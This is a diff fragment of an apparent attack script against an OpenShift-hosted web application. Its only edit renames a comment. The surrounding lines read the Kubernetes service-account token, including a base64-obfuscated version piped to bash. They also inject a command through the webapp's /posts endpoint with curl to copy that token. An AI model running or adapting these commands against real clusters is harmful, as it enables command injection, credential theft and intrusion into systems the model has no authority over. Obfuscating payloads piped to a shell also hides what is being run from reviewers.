@@ -52,7 +52,7 @@ export cmd='token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) && echo
 
 export cmd='echo dG9rZW49JChjYXQgL3J1bi9zZWNyZXRzL2t1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvdG9rZW4pICYmIGVjaG8gJHRva2VuCg== | base64 -d | bash -'
 
-# Get visa-token
+# Get token
 curl -X POST -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token > /tmp/token" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts
 
 # Download kubectl
